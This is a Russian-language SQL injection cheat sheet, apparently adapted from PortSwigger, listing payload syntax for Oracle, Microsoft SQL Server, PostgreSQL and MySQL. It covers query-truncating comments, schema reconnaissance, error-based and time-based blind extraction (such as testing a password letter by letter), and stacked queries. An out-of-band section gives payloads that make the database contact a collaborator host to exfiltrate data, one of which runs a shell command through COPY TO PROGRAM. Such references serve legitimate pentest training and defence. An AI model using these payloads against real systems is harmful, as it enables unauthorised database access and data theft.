# SQL Injection Cheat Sheet (PortSwigger)

Эта шпаргалка содержит полезный синтаксис для эксплуатации SQL-инъекций в Oracle, Microsoft SQL Server, PostgreSQL и MySQL.

---

## 🔗 Работа со строками (String Operations)

Используется для проверки инъекций и обхода фильтров.

### Конкатенация строк (String Concatenation)

Как склеить две строки `'foo'` и `'bar'` в одну.

* **Oracle:** `'foo'||'bar'` 


* **Microsoft:** `'foo'+'bar'` 


* **PostgreSQL:** `'foo'||'bar'` 


* **MySQL:** `'foo' 'bar'` (через пробел) или `CONCAT('foo', 'bar')` 



### Подстроки (Substring)

Как вырезать часть строки (например, чтобы вытаскивать пароль по одной букве).
*Синтаксис: `SUBSTRING('строка', отступ, длина)*`

* **Oracle:** `SUBSTR('foobar', 4, 2)` 


* **Microsoft:** `SUBSTRING('foobar', 4, 2)` 


* **PostgreSQL:** `SUBSTRING('foobar', 4, 2)` 


* **MySQL:** `SUBSTRING('foobar', 4, 2)` 



---

## 🛑 Комментарии (Comments)

Используются, чтобы "отрезать" хвост оригинального запроса и избежать ошибок синтаксиса.

| База данных | Однострочный комментарий | Многострочный / Блочный |
| --- | --- | --- |
| **Oracle** | <br>`--comment` | Не поддерживается в инъекциях обычно |
| **Microsoft** | <br>`--comment`| <br>`/*comment*/`  |
| **PostgreSQL** | <br>`--comment` | <br>`/*comment*/`|
| **MySQL** | <br>`#comment` или `-- comment` (нужен пробел после тире!) | <br>`/*comment*/` |

---

## 🕵️ Разведка (Reconnaissance)

### Версия Базы Данных (Database Version)

Полезно, чтобы понять, какие эксплойты использовать дальше.

* **Oracle:** `SELECT banner FROM v$version` 


* **Microsoft:** `SELECT @@version` 


* **PostgreSQL:** `SELECT version()` 


* **MySQL:** `SELECT @@version` 



### Содержимое Базы (Database Contents)

Как получить список всех таблиц и колонок.

**Oracle:**

```sql
SELECT * FROM all_tables
SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
```



**Microsoft:**

```sql
SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
```



**PostgreSQL:**

```sql
SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
```



**MySQL:**

```sql
SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
```



---

## ⚠️ Ошибки и Логика (Conditional & Error Based)

### Условные ошибки (Conditional Errors)

Позволяет проверить условие (True/False) через вызов ошибки базы данных (например, деление на ноль).

* **Oracle:** `SELECT CASE WHEN (ВАШЕ-УСЛОВИЕ) THEN TO_CHAR(1/0) ELSE NULL END FROM dual` 


* **Microsoft:** `SELECT CASE WHEN (ВАШЕ-УСЛОВИЕ) THEN 1/0 ELSE NULL END` 


* **PostgreSQL:** `1 = (SELECT CASE WHEN (ВАШЕ-УСЛОВИЕ) THEN 1/(SELECT 0) ELSE NULL END)` 


* **MySQL:** `SELECT IF(ВАШЕ-УСЛОВИЕ, (SELECT table_name FROM information_schema.tables), 'a')` 



---

## ⏳ Слепые инъекции (Blind SQLi - Time Based)

Используются, когда приложение не возвращает никаких данных, но мы можем заставить базу "уснуть".

### Простая задержка (Time Delays)

* **Oracle:** `dbms_pipe.receive_message(('a'), 10)` 


* **Microsoft:** `WAITFOR DELAY '0:0:10'` 


* **PostgreSQL:** `SELECT pg_sleep(10)` 


* **MySQL:** `SELECT SLEEP(10)` 



### Условная задержка (Conditional Time Delays)

"Если пароль начинается с 'A', усни на 10 секунд".

* **Oracle:**
```sql
SELECT CASE WHEN (УСЛОВИЕ) THEN 'a'||dbms_pipe.receive_message(('a'), 10) ELSE NULL END FROM dual
```

* **Microsoft:** `IF (УСЛОВИЕ) WAITFOR DELAY '0:0:10'` 


* **PostgreSQL:** `SELECT CASE WHEN (УСЛОВИЕ) THEN pg_sleep(10) ELSE pg_sleep(0) END` 


* **MySQL:** `SELECT IF(УСЛОВИЕ, SLEEP(10), 'a')` 



---

## 🌐 OAST (DNS Lookup & Data Exfiltration)

Продвинутая техника. Мы заставляем базу данных сделать DNS-запрос на наш сервер (Burp Collaborator), передавая украденные данные в поддомене.

### Oracle (XML Exploitation)

Требует уязвимости XXE или привилегий.

```sql
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/1') FROM dual
```



### Microsoft (SQL Server)

```sql
exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
```



### PostgreSQL

```sql
copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
```



### MySQL (Только Windows)

```sql
LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
```



---

## 📚 Stacked Queries (Пакетные запросы)

Возможность выполнить второй SQL-запрос через точку с запятой `;`.

* **Oracle:** Не поддерживается.


* **Microsoft:** Поддерживается (`QUERY-1; QUERY-2`).


* **PostgreSQL:** Поддерживается (`QUERY-1; QUERY-2`).


* **MySQL:** Обычно не работает в веб-приложениях (зависит от API драйвера).